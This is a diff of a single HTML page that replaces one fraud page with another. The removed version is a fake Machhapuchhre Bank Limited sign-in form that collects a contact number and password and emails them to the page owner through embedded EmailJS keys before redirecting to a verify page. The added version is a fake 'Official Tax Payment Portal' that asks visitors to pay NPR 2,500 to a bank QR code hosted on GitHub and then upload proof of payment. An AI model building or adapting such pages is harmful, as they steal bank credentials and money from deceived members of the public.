@@ -3,402 +3,266 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Information Form Demo</title>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Tax Payment Portal</title>
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+
+:root{
+--bg:#f2f5f3;--card:#fff;--ink:#10231c;
+--mut:#64756d;--line:#dbe4df;
+--acc:#087b59;--soft:#e6f4ee;
 }
-
-body {
-    font-family: Arial, sans-serif;
-    color: white;
-    background: #07448c;
+*{box-sizing:border-box}
+body{
+margin:0;background:var(--bg);color:var(--ink);
+font-family:'Plus Jakarta Sans',sans-serif;
+line-height:1.6;
 }
-
-.header {
-    height: 78px;
-    background: white;
-    display: flex;
-    align-items: center;
-    padding: 10px 16px;
-    gap: 11px;
-    color: #164b83;
+.wrap{max-width:900px;margin:auto;padding:30px 18px 55px}
+header{text-align:center;margin-bottom:28px}
+.badge{
+display:inline-block;background:var(--soft);
+color:var(--acc);padding:7px 15px;
+border-radius:30px;font-size:12px;font-weight:800;
 }
-
-.menu {
-    font-size: 22px;
-    color: #555;
-    margin-right: 12px;
+h1{font-size:clamp(30px,6vw,43px);margin:15px 0 7px;letter-spacing:-1.5px}
+header p{color:var(--mut);max-width:520px;margin:auto;font-size:14px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:23px}
+@media(max-width:700px){
+.grid{grid-template-columns:1fr}
+.wrap{padding:24px 14px 40px}
 }
-
-.logo {
-    width: 52px;
-    height: 45px;
-    flex-shrink: 0;
+.qr{
+background:linear-gradient(145deg,#087b59,#064b38);
+color:white;text-align:center;padding:22px;border-radius:22px;
 }
-
-.bank-name {
-    font-size: 12px;
-    font-weight: bold;
-    line-height: 1.5;
+.qr h2{margin:0;font-size:20px}
+.qrbox{
+background:white;border-radius:16px;padding:12px;
+width:min(100%,260px);aspect-ratio:1;
+margin:17px auto;display:flex;align-items:center;justify-content:center;
 }
-
-.bank-name span {
-    display: block;
-    font-size: 15px;
+.qrbox img{width:100%;height:100%;object-fit:contain}
+.qr small{font-size:12px;opacity:.9}
+h2{font-size:19px;margin:0 0 15px}
+.amount{
+background:var(--soft);border:1px solid #c9e9d9;
+border-radius:17px;padding:17px;text-align:center;margin-bottom:20px;
 }
-
-.main {
-    min-height: 100vh;
-    padding: 38px 10.5%;
-    background:
-    radial-gradient(circle at 90% 15%, #165ba4, transparent 40%),
-    linear-gradient(140deg, #0751a5, #073d83, #06458e);
+.amount small{color:var(--mut);font-weight:600}
+.amount strong{display:block;font-size:34px;color:var(--acc);letter-spacing:-1px}
+.steps{list-style:none;padding:0;margin:0;counter-reset:s}
+.steps li{
+counter-increment:s;display:flex;gap:12px;
+padding:12px 0;border-bottom:1px solid var(--line);
 }
-
-.demo-notice {
-    font-size: 11px;
-    color: #d9eaff;
-    margin-bottom: 22px;
+.steps li:last-child{border:0}
+.steps li:before{
+content:counter(s);flex:none;width:28px;height:28px;
+border-radius:50%;background:var(--soft);color:var(--acc);
+font-weight:800;display:grid;place-items:center;font-size:13px;
 }
-
-.login-top {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 28px;
+.steps b{display:block;font-size:14px}
+.steps span{font-size:12px;color:var(--mut)}
+label.f{display:block;font-size:13px;font-weight:700;margin:15px 0 6px}
+input.t{
+width:100%;padding:13px;border:1px solid var(--line);
+border-radius:12px;background:var(--bg);color:var(--ink);
+font:inherit;outline:none;
 }
-
-.login-title {
-    font-size: 19px;
-    font-weight: normal;
+input.t:focus{border-color:var(--acc);box-shadow:0 0 0 3px #087b591a}
+.drop{
+display:block;border:2px dashed var(--line);
+border-radius:16px;padding:22px;text-align:center;
+cursor:pointer;color:var(--mut);font-size:13px;
 }
-
-.security {
-    font-size: 12px;
-    color: #e0ebff;
+.drop:hover{border-color:var(--acc);background:var(--soft)}
+.drop input{display:none}
+.drop strong{display:block;color:var(--ink);margin:5px}
+#prev{display:none;max-width:100%;max-height:180px;border-radius:12px;margin:12px auto 0}
+.go{
+width:100%;padding:15px;border:0;border-radius:13px;
+background:var(--acc);color:white;font:inherit;
+font-size:15px;font-weight:800;cursor:pointer;margin-top:20px;
+transition:.2s;
 }
-
-label {
-    display: block;
-    font-size: 13px;
-    font-weight: bold;
-    margin-bottom: 8px;
-}
-
-input {
-    width: 100%;
-    height: 48px;
-    background: white;
-    border: 1px solid #ddd;
-    border-radius: 2px;
-    padding: 9px;
-    font-size: 13px;
-    outline: none;
-    margin-bottom: 27px;
-    color: #222;
-}
-
-input:focus {
-    border-color: #9dcaff;
-}
-
-.consent {
-    display: flex;
-    align-items: flex-start;
-    gap: 8px;
-    font-size: 11px;
-    line-height: 1.5;
-    margin: -10px 0 20px;
-    color: #e0ebff;
-}
-
-.consent input {
-    width: 14px;
-    height: 14px;
-    margin: 1px 0 0;
-    flex-shrink: 0;
-}
-
-.submit {
-    width: 100%;
-    height: 52px;
-    background: #bd2445;
-    border: none;
-    border-radius: 2px;
-    color: white;
-    font-size: 15px;
-    cursor: pointer;
-    transition: .2s;
-}
-
-.submit:hover {
-    background: #a51b39;
-}
-
-.submit:disabled {
-    opacity: .65;
-    cursor: not-allowed;
-}
-
-.status {
-    display: none;
-    text-align: center;
-    padding: 12px;
-    margin-top: 15px;
-    font-size: 12px;
-    border-radius: 4px;
-    line-height: 1.5;
-}
-
-.status.success {
-    display: block;
-    background: #d8f8e3;
-    color: #126536;
-}
-
-.status.error {
-    display: block;
-    background: #ffe0e0;
-    color: #a51b1b;
-}
-
-.trouble {
-    text-align: center;
-    margin-top: 28px;
-    font-size: 13px;
-    color: #e0ebff;
-}
-
-.transfer {
-    text-align: center;
-    margin-top: 38px;
-    padding-bottom: 25px;
-}
-
-.money-icon {
-    font-size: 83px;
-    margin-bottom: 12px;
-    line-height: 1.3;
-}
-
-.transfer h2 {
-    font-size: 21px;
-    margin-bottom: 20px;
-}
-
-.transfer p {
-    max-width: 420px;
-    margin: auto;
-    font-size: 13px;
-    line-height: 1.7;
-    color: #dceaff;
-}
-
-@media(max-width:600px) {
-    .main {
-        padding: 38px 10.5%;
-    }
-}
-
-@media(max-width:360px) {
-    .bank-name {
-        font-size: 11px;
-    }
-
-    .bank-name span {
-        font-size: 13px;
-    }
-
-    .main {
-        padding-left: 8%;
-        padding-right: 8%;
-    }
+.go:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.err{color:#d6453d;font-size:13px;margin-top:10px;min-height:20px}
+.note{text-align:center;font-size:12px;color:var(--mut);margin-top:18px}
+#done{display:none;text-align:center;max-width:540px;margin:auto}
+.tick{width:85px;height:85px;margin:auto}
+.tick circle{stroke:var(--acc);stroke-width:4;fill:var(--soft)}
+.tick path{stroke:var(--acc);stroke-width:6;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.status{
+background:var(--soft);color:var(--acc);padding:14px;
+border-radius:13px;margin:20px 0;font-weight:800;
 }
 </style>
 </head>
-
 <body>
 
-<header class="header">
+<div class="wrap">
 
-    <div class="menu">☰</div>
-
-    <svg class="logo" viewBox="0 0 100 85">
-        <rect x="3" y="3" width="94" height="76"
-        fill="white" stroke="#bd2948" stroke-width="4"/>
-
-        <rect x="8" y="8" width="84" height="65"
-        fill="#164b83"/>
-
-        <path d="M8 65 L32 43 L46 55 L62 34 L92 64 L92 73 L8 73Z"
-        fill="white"/>
-
-        <path d="M8 65 L32 43 L46 55 L62 34 L92 64"
-        fill="none" stroke="#bd2948" stroke-width="4"/>
-    </svg>
-
-    <div class="bank-name">
-        
-        <span>Machhapuchhre Bank Limited</span>
-    </div>
-
+<header>
+<span class="badge">🏛️ OFFICIAL TAX PAYMENT PORTAL</span>
+<h1>Tax Payment</h1>
+<p>Complete your tax payment securely by scanning the bank QR code and submitting your payment confirmation.</p>
 </header>
 
-<main class="main">
+<main id="main">
 
-    <div class="demo-notice">
-    </div>
+<div class="amount">
+<small>FIXED TAX PAYMENT AMOUNT</small>
+<strong>NPR 2,500/-</strong>
+<small>Two Thousand Five Hundred Rupees Only</small>
+</div>
 
-    <div class="login-top">
-        <div class="login-title">Sigin In</div>
-        <div class="security">♙ &nbsp; Privacy Notice</div>
-    </div>
+<div class="grid">
 
-    <form id="demoForm">
+<section class="qr">
+<h2>Scan Bank QR to Pay</h2>
+<div class="qrbox">
+<img
+alt="Bank payment QR code"
+src="https://raw.githubusercontent.com/Rupayy/Rupay/refs/heads/main/Screenshot_20260505_125434_MBL%20M-Smart.jpg">
+</div>
+<small>Scan using your mobile banking app</small>
+</section>
 
-        <label for="fullname">Full name</label>
+<section class="card">
+<h2>Payment Instructions</h2>
+<ol class="steps">
+<li><div>
+<b>Open your mobile banking</b>
+<span>Open your preferred banking application.</span>
+</div></li>
+<li><div>
+<b>Scan the bank QR code</b>
+<span>Scan the QR displayed on this page.</span>
+</div></li>
+<li><div>
+<b>Pay NPR 2,500</b>
+<span>Enter the exact required payment amount.</span>
+</div></li>
+<li><div>
+<b>Save payment receipt</b>
+<span>Take a screenshot after successful payment.</span>
+</div></li>
+<li><div>
+<b>Submit payment proof</b>
+<span>Upload your receipt using the form.</span>
+</div></li>
+</ol>
+</section>
+</div>
 
-        <input
-            type="text"
-            id="fullname"
-            name="User id"
-            placeholder="Enter your Contact number"
-            maxlength="100"
-            required
-        >
+<section class="card" style="margin-top:20px">
+<h2>Submit Tax Payment Details</h2>
 
-        <label for="job">Password</label>
+<label class="drop">
+<input type="file" id="file" accept="image/*">
+<span style="font-size:30px">📤</span>
+<strong id="fname">Upload Payment Receipt</strong>
+PNG or JPG
+<img id="prev" alt="Payment receipt preview">
+</label>
 
-        <input
-            type="text"
-            id="job"
-            name="Password"
-            placeholder="Enter your Password"
-            maxlength="100"
-            required
-        >
+<label class="f" for="name">Full Name</label>
+<input class="t" id="name" placeholder="Enter your full name" autocomplete="name">
 
-        <label class="consent">
-            <input type="checkbox" id="consent" required>
-            I agree to send these details to the website owner by email.
-        </label>
+<label class="f" for="ref">Transaction Reference (Optional)</label>
+<input class="t" id="ref" placeholder="Enter transaction ID">
 
-        <button class="submit" id="submitBtn" type="submit">
-            Submit
-        </button>
+<div class="err" id="err" role="alert"></div>
 
-        <div class="status" id="status"></div>
+<button class="go" id="submit">
+Submit Tax Payment →
+</button>
 
-    </form>
-
-    <div class="trouble">
-        Having trouble submitting?
-    </div>
-
-    <section class="transfer">
-
-        <div class="money-icon">💸</div>
-
-        <h2>Fund Transfer</h2>
-
-        <p>
-            Learn about fund transfer services and
-            available transfer options.
-        </p>
-
-    </section>
+<div class="note">
+🔒 Your submitted details are used for payment verification.
+</div>
+</section>
 
 </main>
 
+<section class="card" id="done" aria-live="polite">
+
+<svg class="tick" viewBox="0 0 100 100">
+<circle cx="50" cy="50" r="46"/>
+<path d="M30 52l14 14 27-30"/>
+</svg>
+
+<h2>Payment Details Submitted!</h2>
+
+<p id="hello">Your payment information has been submitted.</p>
+
+<div class="status">
+🟡 Payment Verification Pending
+</div>
+
+<p>
+Your tax payment details have been submitted for review.
+Please retain your original bank transaction receipt.
+</p>
+
+<p><b>Tax Amount: NPR 2,500/-</b></p>
+
+</section>
+</div>
+
 <script>
+const file=document.getElementById('file');
+const preview=document.getElementById('prev');
+const error=document.getElementById('err');
 
-// EMAILJS CONFIGURATION
+file.addEventListener('change',()=>{
+const selected=file.files[0];
+if(!selected)return;
 
-const PUBLIC_KEY = "6erjYuJfp4rK9fAC6";
-const SERVICE_ID = "service_ftvqdei";
-const TEMPLATE_ID = "template_04bxu5b";
+if(!selected.type.startsWith('image/')){
+error.textContent='Please select a valid image.';
+file.value='';
+return;
+}
 
-// Initialize EmailJS
+if(selected.size>5*1024*1024){
+error.textContent='Image must be smaller than 5MB.';
+file.value='';
+return;
+}
 
-emailjs.init({
-    publicKey: PUBLIC_KEY
+error.textContent='';
+document.getElementById('fname').textContent=selected.name;
+preview.src=URL.createObjectURL(selected);
+preview.style.display='block';
 });
 
-// FORM ELEMENTS
+document.getElementById('submit').addEventListener('click',()=>{
 
-const form = document.getElementById("demoForm");
-const button = document.getElementById("submitBtn");
-const statusBox = document.getElementById("status");
+const name=document.getElementById('name').value.trim();
+const transaction=document.getElementById('ref').value.trim();
 
-// FORM SUBMISSION
+if(!file.files[0]){
+error.textContent='Please upload your payment receipt.';
+return;
+}
 
-form.addEventListener("submit", async function(e) {
+if(!name){
+error.textContent='Please enter your full name.';
+return;
+}
 
-    e.preventDefault();
+document.getElementById('hello').textContent=
+'Thank you, '+name+'. Your NPR 2,500 tax payment details have been submitted.';
 
-    if (!form.reportValidity()) return;
+document.getElementById('main').style.display='none';
+document.getElementById('done').style.display='block';
 
-    button.disabled = true;
-    button.textContent = "Wait...";
-
-    statusBox.className = "status";
-    statusBox.style.display = "none";
-
-    // Email template parameters
-
-    const templateParams = {
-        full_name: document.getElementById("fullname").value.trim(),
-        favourite_job: document.getElementById("job").value.trim()
-    };
-
-    try {
-
-        // Send information through EmailJS
-
-        await emailjs.send(
-            SERVICE_ID,
-            TEMPLATE_ID,
-            templateParams
-        );
-
-        statusBox.textContent =
-            "✓ Success...";
-
-        statusBox.className = "status success";
-        statusBox.style.display = "block";
-
-        // Redirect after successful email submission
-
-        button.textContent = "Waiting..";
-
-        setTimeout(function() {
-            window.location.href = "Verify.html";
-        }, 800);
-
-    } catch (error) {
-
-        console.error("EmailJS Error:", error);
-
-        statusBox.textContent =
-            "Unable to send. Please check your internet connection and EmailJS configuration.";
-
-        statusBox.className = "status error";
-        statusBox.style.display = "block";
-
-        button.disabled = false;
-        button.textContent = "Submit";
-
-    }
-
+window.scrollTo({top:0,behavior:'smooth'});
 });
-
 </script>
 
 </body>
